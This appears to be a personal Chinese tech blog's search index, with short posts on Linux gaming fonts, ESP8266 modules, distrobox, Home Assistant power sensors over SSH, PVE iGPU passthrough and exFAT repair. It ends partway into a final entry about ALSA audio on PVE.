<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>城市天际线等游戏在 Linux Wine Proton 中的中文字体方块空白问题</title>
    <link href="/archives/89a6fa5/"/>
    <url>/archives/89a6fa5/</url>
    
    <content type="html"><![CDATA[<p>原因是有些游戏的中文环境写死了微软雅黑，我目前发现存在这个问题的游戏（公司）有：</p><ul><li>城市天际线</li><li>Ndemic Creations 包括瘟疫公司、反叛公司等</li><li>Jutsu Games 包括 911 接线员、112 接线员等</li></ul><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>用游戏（城市天际线）本身的 Font Changer 类模组指定字体到思源黑体</p><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>在 wine 前缀<br>drive_c&#x2F;windows&#x2F;Fonts&#x2F; 下把思源、Noto 等其他字体，软链接或者复制到 msyh.ttf msyh.ttc 等的名字 </p><p>还是不行就，复制一个 Windows 安装下 C:\Windows\Fonts 里的 <strong>全部</strong> 内容（尤其是msyh、simhei、simsun 等）到 wine 前缀</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>TipsTricks</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>久量 DP-9102 手电筒的充电头类别和型号</title>
    <link href="/archives/4c47bd14/"/>
    <url>/archives/4c47bd14/</url>
    
    <content type="html"><![CDATA[<p>久量 LED 锂电池 验钞充电式手电筒<br>型号：DP-9102<br>LI-ION BATTERY MONEY DETECTOR LED TORCH</p><p><img src="https://cdn.jiecs.top/img/2025/09/1000040780.webp" alt="包装壳"><br><img src="https://cdn.jiecs.top/img/2025/09/IMG_20250906_220750.webp" alt="包装壳背面说明"><br><img src="https://cdn.jiecs.top/img/2025/09/1000040781.webp" alt="充电器"><br><img src="https://cdn.jiecs.top/img/2025/09/1000040784.webp" alt="本体"></p><hr><p><img src="https://cdn.jiecs.top/img/2025/09/1000040782.webp" alt="充电器"><br><img src="https://cdn.jiecs.top/img/2025/09/IMG_20250906_215419.webp" alt="充电器详细参数"></p><p>充电器（标明的）型号：XW-001<br>输入：AC100V~240V 47&#x2F;63Hz 100mA<br>输出：DC 4.2V 500mA<br>带有一颗 LED 显示充电状态，未充满红灯，已充满绿灯<br>搜索 4.2V 500mA 即可买到兼容的充电器</p><p>是 3.5*1.35mm 偏细长的 DC 口</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ESP-12E ESP-12F ESP12S 和 ESP8266MOD 的区别</title>
    <link href="/archives/910267f4/"/>
    <url>/archives/910267f4/</url>
    
    <content type="html"><![CDATA[<p>ESP8266 是一小块芯片<br>而带银色屏蔽罩的，是可以用的“模块”，内部集成了小电容、晶振之类的最小系统<br>ESP8266MOD 就是模块的意思，该模块原厂厂家是安信可，但也有很多其他厂商也做一样的兼容模块</p><p><img src="https://cdn.jiecs.top/img/2025/09/Screenshot_20250902-213301_%E6%B7%98%E5%AE%9D.png" alt="screenshot"></p><p>如图， 直观区别主要在最下面一排六个 IO 口的有无、PCB 天线的设计，以及中心一块散热铜。当然模块内部也有些许不同，但大多数情况都是引脚封装兼容、程序通刷的</p><p>发布顺序为：ESP-12E → ESP-12F → ESP-12S</p><p>需要注意的是，ESP-12 下面一排六个 IO 口虽然看着是有，但实际上一般都无法使用。<br>包括官方安信可的手册里，也写了不可用<br><img src="https://cdn.jiecs.top/img/2025/09/Screenshot_20250903-212556_Fennec.png" alt="screenshot"><br>安信可文档 <a href="https://docs.ai-thinker.com/esp8266">https://docs.ai-thinker.com/esp8266</a><br>因为这一排 IO 都用于连接到内置的 SPI flash 了，IO9 IO10 用于四线 SPI 的另外两条线</p><p>还有常见的 ESP-01、 ESP8285、ESP-01S 一般指的是通过串口 AT 协议，可以让不带 WiFi 功能的单片机通过串口交换一定 WiFi 数据的 WiFi 模块</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>嵌入式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过 distrobox 在任何发行版安装星火应用商店</title>
    <link href="/archives/43e7ecc1/"/>
    <url>/archives/43e7ecc1/</url>
    
    <content type="html"><![CDATA[<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>由于 WPS 直接在 distrobox 环境下运行我遇到了各种麻烦的问题，于是尝试在 distrobox 中安装星火应用商店，再安装 WPS。问题能够解决，于是顺便记录一下 distrobox 中安装星火的过程。总体上还是非常轻松的，十几分钟就能搞定</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote><p>系统环境为 Bluefin Linux (based-on Fedora Silverblue)</p></blockquote><p>创建 distrobox 使用的是这个 image</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">distrobox create --image quay.io/toolbx/ubuntu-toolbox:latest --name box-spark<br></code></pre></td></tr></table></figure><p>当前的 latest 应该是 24.04 (LTS)<br><code>ubuntu-toolbox</code> 是精简后的 ubuntu image，亲测也足够星火运行的，用完整的 ubuntu image 应当更加没有问题</p><p>默认没有 systemd 支持，而星火应用商店的更新通知（定时检查更新）依赖 systemd，可以通过 distrobox 的 <code>--init</code> flag 实现，但是这会让你<a href="#%E5%85%B3%E4%BA%8E%E4%B8%8E-systemd-%E7%9A%84%E4%B8%8D%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98">用不了中文输入法</a>。所以还是建议不用 systemd</p><p>进入容器命令行之后，正常 apt install <a href="https://www.spark-app.store/">星火应用商店的 .deb</a> 即可，星火应用商店会拖家带口把 qt、dtk、gcc 环境、工具链都装上，占用空间 600M+ 是正常的</p><p>没有什么报错安装完成之后（不装 systemd 的话安装过程会有一个小报错），就可以通过 <code>spark-store</code> 运行图形化的星火应用商店</p><h2 id="Post-fix-Workaround"><a href="#Post-fix-Workaround" class="headerlink" title="Post-fix &amp; Workaround"></a>Post-fix &amp; Workaround</h2><h3 id="第一个问题：中文字体坏的"><a href="#第一个问题：中文字体坏的" class="headerlink" title="第一个问题：中文字体坏的"></a>第一个问题：中文字体坏的</h3><p>这个很好解决：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install fonts-noto-cjk<br></code></pre></td></tr></table></figure><p>或者安装任何你喜欢的字体即可</p><h3 id="第二个问题：点击“下载并安装”，下载之后就没动作了，不会自己安装"><a href="#第二个问题：点击“下载并安装”，下载之后就没动作了，不会自己安装" class="headerlink" title="第二个问题：点击“下载并安装”，下载之后就没动作了，不会自己安装"></a>第二个问题：点击“下载并安装”，下载之后就没动作了，不会自己安装</h3><p>解决方案： <a href="https://gitee.com/spark-store-project/spark-store/issues/IBML1L">https://gitee.com/spark-store-project/spark-store/issues/IBML1L</a><br>即在 distrobox 容器内执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/sh</span><br><span class="hljs-string">sudo &quot;$@&quot;&#x27;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /usr/local/bin/pkexec<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chmod</span> +x /usr/local/bin/pkexec<br></code></pre></td></tr></table></figure><p>这是因为原本正常安装的星火应用商店，应当在安装过程中通过 <code>pkexec</code> 提升到 root 权限，因为这样可以跳出一个 askpass 图形界面请求用户输入密码。而在容器中一般直接使用 <code>sudo</code>，<code>pkexec</code> 由于各种原因往往没法正常工作。不是完全不可以，但挺麻烦的</p><p>所以以上命令能替换 <code>/usr/local/bin/pkexec</code> 的内容为一个脚本，直接原地将命令丢给 sudo</p><p>由于创建容器的时候就没有用 <code>--root</code> 创建 rootful 容器，所以这个 sudo 出来的 root <em>应该</em> 也不是宿主机的 root，不需要特别在乎安全问题。只要你用 Podman 就完全是 rootless 的</p><h3 id="第三个问题：搜索框没法输入中文"><a href="#第三个问题：搜索框没法输入中文" class="headerlink" title="第三个问题：搜索框没法输入中文"></a>第三个问题：搜索框没法输入中文</h3><p>最简单的 <del>经典</del> 解决方案就是从别的地方打好字然后粘贴进去</p><p>当然也可以选择一步到位。我使用 fcitx5 框架，需要在容器里安装对应前端界面（我也不知道为啥宿主机的 fcitx5 前端在容器里就不工作了）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install fcitx5-frontend-all<br></code></pre></td></tr></table></figure><p>这样安装的只是适用于 qt gtk 等程序的 fcitx5 前端，后端还是通过 D-Bus 连宿主机的（还好 distrobox 上 D-Bus 开箱即用）<br>当然就是要再牺牲掉一些存储空间，fcitx5 也喜欢拖家带口</p><h4 id="关于与-systemd-的不兼容问题"><a href="#关于与-systemd-的不兼容问题" class="headerlink" title="关于与 systemd 的不兼容问题"></a>关于与 systemd 的不兼容问题</h4><p>如果你在创建 distrobox 的时候选择启用了 systemd (init system)，那也会无法输入中文，安装 <code>fcitx5-frontend-all</code> 也没用。这是因为<a href="https://distrobox.it/useful_tips/#using-init-system-inside-a-distrobox">开启 systemd 之后，容器就无法访问宿主机的进程资源了</a></p><blockquote><p>Note however that in this mode, you’ll not be able to access host’s processes from within the container.</p></blockquote><p>你可以通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dbus-send --session --dest=org.freedesktop.DBus --<span class="hljs-built_in">type</span>=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames<br></code></pre></td></tr></table></figure><p>在容器内和主机内列出可用的 DBus 来确认这个问题</p><p>这个问题我还没找到解决办法。但大多数“正常”的程序都是不应该与 systemd 硬耦合的，所以就还是建议不用 systemd</p><p>其他问题目前都还没遇到</p><ul><li>WPS 开箱即用没有任何问题</li><li>能正常用 <code>distrobox-export --app WPS</code> 将 WPS 桌面图标 .desktop 导出到宿主机</li><li>通过星火应用商店安装的 ACE 兼容环境可以在命令行正常进入。这样对于适合安装到 ACE 兼容环境中的软件，问题应当又能解决很多<br>再其他的问题也就是星火应用商店本身的问题了（可不是容器的问题）</li></ul>]]></content>
    
    
    <categories>
      
      <category>简单教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>Linux</tag>
      
      <tag>我的电脑</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HomeAssistant 通过 OPPO 云服务跟踪一加/OPPO 设备的位置</title>
    <link href="/archives/ae8d6418/"/>
    <url>/archives/ae8d6418/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/jiesou/oppo_cloud_tracker">https://github.com/jiesou/oppo_cloud_tracker</a><br>花了两天时间做了一个集成，基本够用了，挂一个 Selenium Docker 容器，然后连连上去就行</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HomeAssistant 通过 SSH 获取 Intel 主机自己的功耗</title>
    <link href="/archives/5b1dbf96/"/>
    <url>/archives/5b1dbf96/</url>
    
    <content type="html"><![CDATA[<p>需要使用 <a href="https://www.home-assistant.io/integrations/command_line">https://www.home-assistant.io/integrations/command_line</a> 这个 commend line 集成，通过命令行输入数据。</p><h2 id="从命令行获取功耗数据"><a href="#从命令行获取功耗数据" class="headerlink" title="从命令行获取功耗数据"></a>从命令行获取功耗数据</h2><p>Intel 一直支持通过 RAPL 获取 CPU 自身的耗电量（电能）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@casaos:/# <span class="hljs-built_in">cat</span> /sys/class/powercap/intel-rapl/intel-rapl:0/name<br>package-0<br>root@casaos:/# <span class="hljs-built_in">cat</span> /sys/class/powercap/intel-rapl/intel-rapl:0/energy_uj<br>134021323469<br></code></pre></td></tr></table></figure><p>这个是 package-0 域的，包含 DRAM、核显，就是整个 SoC 的功耗。</p><p>而 Intel Syklake 之后的版本支持 PSYS 域，即 <code>intel-rapl:1</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@casaos:/# <span class="hljs-built_in">cat</span> /sys/class/powercap/intel-rapl/intel-rapl:1/name<br>psys<br>root@casaos:/# <span class="hljs-built_in">cat</span> /sys/class/powercap/intel-rapl/intel-rapl:1/energy_uj<br>74239569162<br></code></pre></td></tr></table></figure><p>基本上就是全板的功耗了，还包含 SoC 之外设备的功耗（当然不含电源适配器的损耗）</p><h2 id="导入-HomeAssistant"><a href="#导入-HomeAssistant" class="headerlink" title="导入 HomeAssistant"></a>导入 HomeAssistant</h2><p>HomeAssistant 本身命令行的环境是在容器里，各种麻烦。脱离容器最简单的方法是直接 SSH 连主机。而 <code>ssh</code> 不支持非交互式密码认证，那就是说要密钥认证。</p><p>配置好主机的 SSH 密钥认证（这种网上教程太多了，就是 <code>ssh-keygen</code>）之后，把私钥粘贴到 <code>/config/ssh-key</code></p><blockquote><p><code>/homeassistant</code> 基本就是 <code>/config</code> 的软链接，但用 <code>/config</code> 没有问题</p></blockquote><blockquote><p>因为 HomeAssistant Commend Line 执行权限的问题，私钥不能拷到 <code>/root/.ssh</code> 下，虽然 <code>whoami</code> 是 root，但有各种问题</p></blockquote><p>然后最终就是 <code>configuration.yaml</code> 中添加：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">command_line:</span><br>    <span class="hljs-comment"># 主机功率消耗</span><br>    <span class="hljs-comment"># 原单位微焦（uJ），awk 乘以 6 变成焦耳（J）</span><br>    <span class="hljs-comment"># 连接到 casaos，通过私钥实现免密码登录</span><br>    <span class="hljs-comment"># -T 强制非交互式不分配伪终端，同时实现 Ubuntu 登录的欢迎消息不显示</span><br>    <span class="hljs-comment"># 可在命令后添加 2&gt;&amp;1; echo &quot;EXIT_CODE:$?&quot; 手动引导输出 exit code，让错误日志更丰富</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">sensor:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;主机累计电量&quot;</span><br>      <span class="hljs-attr">device_class:</span> <span class="hljs-string">&quot;energy&quot;</span><br>      <span class="hljs-attr">state_class:</span> <span class="hljs-string">&quot;total_increasing&quot;</span><br>      <span class="hljs-attr">unit_of_measurement:</span> <span class="hljs-string">&quot;J&quot;</span><br>      <span class="hljs-attr">scan_interval:</span> <span class="hljs-number">15</span><br>      <span class="hljs-attr">command:</span> <span class="hljs-string">&gt;</span><br><span class="hljs-string">        ssh -i /config/ssh-key -o &quot;StrictHostKeyChecking=no&quot; -T root@casaos.lan</span><br><span class="hljs-string">        &#x27;cat /sys/class/powercap/intel-rapl/intel-rapl:1/energy_uj | awk &quot;&#123;printf \&quot;%.6f\n\&quot;, \$1/1000000&#125;&quot;&#x27;</span><br></code></pre></td></tr></table></figure><p>具体参数设置基本比较清楚了<br>建议获取到单位为焦耳的数据，然后再通过辅助元素，变化率传感器之类的算出功耗。不要直接 bash 输出最终结果</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>技术</tag>
      
      <tag>教程</tag>
      
      <tag>PVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>G4560 HP 400g3 小主机 PVE Windows 核显穿透直连研究日志，以及 PVE 环境如何把 Windows 从 GPT 无损转为 MBR</title>
    <link href="/archives/4522cbac/"/>
    <url>/archives/4522cbac/</url>
    
    <content type="html"><![CDATA[<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>从实用主义的角度考虑，最简单的方法是 GVT-g 拆分核显，GRUB 里添加个参数就能用，也能实现一定程度上的硬件加速，比如 Chrome 解码视频。</p><p>但拆分核显得到的核显是“无头”，或者说没法绑定显示器的。一些软件，比如 Sunshine 串流。使用虚拟显示器时，出于 Sunshine 方面的问题，<strong>无法通过 QSV 进行硬件加速编码</strong>。<br>RustDesk 是能实现无头核显硬件加速的，但是 RustDesk 的使用体验比较糟糕。</p><p>于是最后只能考虑将整个核显进行穿透，不进行拆分。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>G4560 属于 7 代 Kaby Lake。经过一番搜寻，比较可靠、直接的核显穿透方案是 <a href="https://github.com/lixiaoliu666/intel6-14rom/tree/qemu7-9">https://github.com/lixiaoliu666/intel6-14rom/tree/qemu7-9</a>。<br>其中 <code>master</code> 分支下的 README 仅适用于 QEMU 10，需要换到作者提供的 QEMU、KVM 包（<a href="https://github.com/lixiaoliu666/pve-anti-detection">https://github.com/lixiaoliu666/pve-anti-detection</a>）<br>而 <code>qemu7-9</code> 分支下的 README <strong>适用于 QEMU 9.2</strong>，这样就不需要换 KVM，对原 PVE 环境的影响更小。所以选择这个分支。<br>我的环境是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@400g3pve:~# pveversion <br>pve-manager/8.4.1/2a5fa54a8503f96d (running kernel: 6.8.12-11-pve)<br>root@400g3pve:~# qemu-system-x86_64 --version<br>QEMU emulator version 9.2.0 (pve-qemu-kvm_9.2.0-5)<br>Copyright (c) 2003-2024 Fabrice Bellard and the QEMU Project developers<br></code></pre></td></tr></table></figure><p>具体配置方式，在作者 李晓流 的专栏，以及 README 里以及写得很清楚了。也可以部分参考 <a href="https://imacos.top/2025/06/09/pve-intel-6-14-q35">https://imacos.top/2025/06/09/pve-intel-6-14-q35</a>。</p><p>总之：主要参考 <a href="https://www.bilibili.com/opus/1067771179546181639">https://www.bilibili.com/opus/1067771179546181639</a> 里 <strong>qemu 9.2</strong> 的部分。</p><hr><p>注意：</p><ul><li><code>hostpci0</code> 里不需要 <code>legacy-igd=1</code>。</li><li>下载 .rom 文件的时候要下载 Releases 里 V1.0 的，即 <a href="https://github.com/lixiaoliu666/intel6-14rom/releases/tag/v1.0-20250413-161986">https://github.com/lixiaoliu666/intel6-14rom/releases/tag/v1.0-20250413-161986</a>，这个版本才支持 QEMU 9.2，V2.0 是 QEMU 10 的。就下载 <code>6-14.rom</code> 大全版本即可，放到 <code>/usr/share/kvm/</code> 目录下。</li></ul><hr><p>我最终的 .conf 如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">agent: 1<br>args: -<span class="hljs-built_in">set</span> device.hostpci0.bus=pcie.0 -<span class="hljs-built_in">set</span> device.hostpci0.addr=02.0 -<span class="hljs-built_in">set</span> device.hostpci0.x-igd-gms=0x2 -<span class="hljs-built_in">set</span> device.hostpci0.x-igd-opregion=on<br>boot: order=scsi0;net0;ide0<br>cores: 4<br>cpu: host<br>hostpci0: 0000:00:02.0,pcie=1,romfile=6-14.rom,x-vga=1<br>machine: q35<br>memory: 4096<br>meta: creation-qemu=9.2.0,ctime=1749979104<br>name: win<br>net0: virtio=BC:24:11:44:71:AA,bridge=vmbr0,firewall=1<br>numa: 1<br>ostype: l26<br>scsi0: local-lvm:vm-103-disk-1,discard=on,iothread=1,size=32G,ssd=1<br>scsihw: virtio-scsi-single<br>smbios1: uuid=8072d170-12f0-4aa5-86ef-f10471bb4282<br>sockets: 1<br>tpmstate0: local-lvm:vm-103-disk-2,size=4M,version=v2.0<br>vmgenid: 0288c536-37d1-4615-95f9-69e1663584a7<br></code></pre></td></tr></table></figure><p>接着，你会发现我的配置里没有 <code>bios:ovmf</code>，这意味着它会以默认的 SeaBIOS 进行 Legacy 启动。</p><p>这是因为我这台 G4560 和作者 README 里描述的情况一致：</p><blockquote><p>有些机器他还是有小bug的，会和这个项目 <a href="https://github.com/my33love/gk41-pve-ovmf">https://github.com/my33love/gk41-pve-ovmf</a> 中的描述症状一样：WIN10 直通安装没有任何问题，可以正常直通到物理显示器，但是一旦<strong>装了UHD驱动就黑屏</strong>了，只能RDP远程进去，暂时没找到解决办法！ubuntu测试完美，直通安装与安装完显示器都能在4K 60HZ下工作。我在j4105机器上遇见一样的问题，不管是用最新的6-10代核显驱动还是2019年及以前发布的6-10代核显驱动，只要一驱动了必黑屏。这是前人源代码埋下来的坑，快4年了无人解决，我也解决不了，找我没用。有网友反馈<strong>驱动黑屏问题是因为硬盘分区表问题，用mbr就可以了</strong>，我估计4-10代如果安装核显后驱动黑屏，大家可以试下安装的时候硬盘用mbr，实在不会就选择ide硬盘给win10虚拟机试试，如果能解决记得反馈。</p><p><a href="https://github.com/lixiaoliu666/intel6-14rom/tree/qemu7-9#:~:text=%E4%BD%86%E6%98%AF%E5%91%A2%E6%9C%89%E4%BA%9B,%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BE%97%E5%8F%8D%E9%A6%88%E3%80%82">（原文）</a></p></blockquote><p>即设备管理器里可以看到物理视频口所输出的显示器，但显示器就是不显示，没信号，黑屏。然后 RDP 能显示，而 Sunshine 串流也是和物理显示器一样直接串出个黑屏。</p><p>所以为了解决这个问题，Windows VM 的硬盘分区表必须是 MBR，这也意味着 Windows 必须不能是 GPT+OVMF (UEFI) 启动的，而必须是 MBR+SeaBIOS (Legacy) 启动的。</p><p>对于已经装好了的 Windows，实际上有很多方式可以无损从 UEFI 转到 Legacy。这里进行介绍。</p><h2 id="把-PVE-里的-Windows-VM-从-GPT-无损转为-MBR"><a href="#把-PVE-里的-Windows-VM-从-GPT-无损转为-MBR" class="headerlink" title="把 PVE 里的 Windows VM 从 GPT 无损转为 MBR"></a>把 PVE 里的 Windows VM 从 GPT 无损转为 MBR</h2><p>主要麻烦的就是 PVE 的 VirtIO SCSI 驱动，很多 PE 不支持，没法认出 Windows 系统磁盘。</p><p>调整分区和引导方式的时候，建议把之前核显直通的配置先删掉，改用默认显示。<br>我这里使用 <a href="https://down.edgeless.top/">Edgeless</a> 没有问题。微 PE 精简太多了，VirtIO SCSI 的驱动支持有问题。</p><blockquote><p>Edgeless 可以直接用设备管理器装好驱动。而另外，理论上也能通过 Dism&#x2F;Dism++ 直接把驱动做到 PE 镜像里，但要拆 ISO 什么的，我没成功过</p></blockquote><p>上 PE 需要和以往一样添加一个 IDE 的 CD&#x2F;DVD 驱动器，把 Edgeless 的 .iso 挂载上去。并在选项里调整引导顺序（也可在开机时按 Esc 选择启动项）</p><p>Edgeless 里要添加 VirtIO SCSI 驱动是很简单的：</p><ol><li>确保先也通过 CD&#x2F;DVD 驱动器的方式挂载了 virtio 驱动的 .iso（例如 virtio-win-0.1.271.iso）</li><li>设备管理器里，找到那个未识别的 SCSI 控制器。</li><li>右键，更新驱动程序，浏览我的电脑以查找驱动程序。<br>选择这个 <code>vioscsi</code> 驱动<br><img src="https://cdn.jiecs.top/img/2025/07/%E6%88%AA%E5%9B%BE_2025-07-24_03-18-37.png" alt="选择目录 E:\vioscsi\win10\amd64"></li><li>装上驱动之后，就能通过 DiskGenius 将分区表改为 MBR</li><li>如下图，可以把前面两个 FAT32 和“XENIX”的 EFI 小分区删掉，Legacy 启动不需要小分区<br><img src="https://cdn.jiecs.top/img/2025/07/%E6%88%AA%E5%9B%BE_2025-07-24_00-51-09.png" alt="四个分区，分别是 EFI 分区、Microsoft 保留分区 (MSR)、系统 C 盘、WinRE 分区"></li><li>同理，pve vm 的 .conf 里的 <code>efidisk: local-lvm:vm-103-disk-0,efitype=4m,size=4M</code> 这行也可以删掉了。<code>efidisk</code> 是给 EFI 用的</li><li>然后，使用 Edgeless 的 IQI 引导修复即可一键恢复 Legacy 引导。如果修复不了，尝试使用“理顺盘符”，要确保 C 盘在 PE 里的盘符也的确是 C 盘</li></ol><p>引导修复完成，先尝试进一下看看 Windows 能不能启动。然后就可以恢复之前核显直通的配置，重新 <code>display: none</code>。</p><p>再次启动 Windows，理论上物理显示器就能看到 Windows 的画面了。还是无信号、黑屏的话就插拔一下 DP 线，反正我是可以了。</p>]]></content>
    
    
    <categories>
      
      <category>简单教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>技术</tag>
      
      <tag>教程</tag>
      
      <tag>我的电脑</tag>
      
      <tag>PVE</tag>
      
      <tag>好文</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GK905 LK 光轴 网吧键盘 Fn 按键灯效功能图</title>
    <link href="/archives/c3965c3d/"/>
    <url>/archives/c3965c3d/</url>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jiecs.top/img/2025/07/964-IMG_20250722_093641.webp" alt="GK905 LK光轴 灯效功能图"></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>我的电脑</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>exFAT 调整大小时，bitmap 的故障</title>
    <link href="/archives/7a52ff22/"/>
    <url>/archives/7a52ff22/</url>
    
    <content type="html"><![CDATA[<p>在我想把 exFAT 换成 ext4 的过程中遇到了太多的坑，于是在这里记录一下</p><p>首先 exFAT 设计出来，就不是能被轻松调整大小的。包括 Windows 磁盘管理、GParted，甚至傲梅分区助手都没法改它大小<br>常见的，只有 DiskGenius 能改大小</p><p>然后我改大小，又报各种文件系统错误，不让我改，DiskGenius 自己又没法修复 exFAT 的错误<br>fsck 修掉了几个问题，留下几个问题。最后就剩一个顽固的问题。就是：<br>$Bitmap中有标记为已使用的未用簇</p><p>Windows 的 chkdsk 也不行，说自己修好了，但总是能检查出一样的问题</p><p>翻遍网络找到这个：<a href="https://www.reddit.com/r/datarecovery/comments/tbs708/comment/ipny7b5">https://www.reddit.com/r/datarecovery/comments/tbs708/comment/ipny7b5</a><br>好像是最接近真相的<br>就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs batch">chkdsk X: /f /x /freeorphanedchains<br></code></pre></td></tr></table></figure><p>结果我试了还是不行</p><p>最后，参照 Reddit 里别的帖子，用 DiskGenius 的前身 PartitionGuru 解决了问题</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>我的电脑</tag>
      
      <tag>TipsTricks</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Proton DXVK 转译运行《幽灵行者2》，新画面加载时卡顿</title>
    <link href="/archives/5771df32/"/>
    <url>/archives/5771df32/</url>
    
    <content type="html"><![CDATA[<p>如果是着色器编译导致<br>解决办法，设置环境变量<br><code>__GL_SHADER_DISK_CACHE_SKIP_CLEANUP=1</code></p><p>然而，也可能是 Resizable BAR 的兼容性问题<br>即 Linux 上的 kernel lockdown 与 PCIE Resizable BAR 是冲突的 而且开启 ReBAR 反而会大幅影响性能。就反映在那种对显存需求大的游戏上（比如《Ghostrunner 2》），加载新画面会卡好久。<br>同时现在 kernel lockdown 在安全启动的电脑上，都是默认开着的。所以这个问题常常被忽略<br>参见：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ man kernel_lockdown.7<br>提示会影响：       •  The use of direct PCI BAR access.<br></code></pre></td></tr></table></figure><p><a href="https://www.reddit.com/r/linux_gaming/comments/v58ts5/quick_heads_up_about_something_i_discovered">https://www.reddit.com/r/linux_gaming/comments/v58ts5/quick_heads_up_about_something_i_discovered</a><br>解决办法：<br>关掉 UEFI&#x2F;BIOS 里的 Resizable BAR<br>或者关闭安全启动（关闭 kernel lockdown）</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>我的电脑</tag>
      
      <tag>TipsTricks</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PVE 在裸金属机上通过 ALSA 播放声音</title>
    <link href="/archives/8fd95410/"/>
    <url>/archives/8fd95410/</url>
    
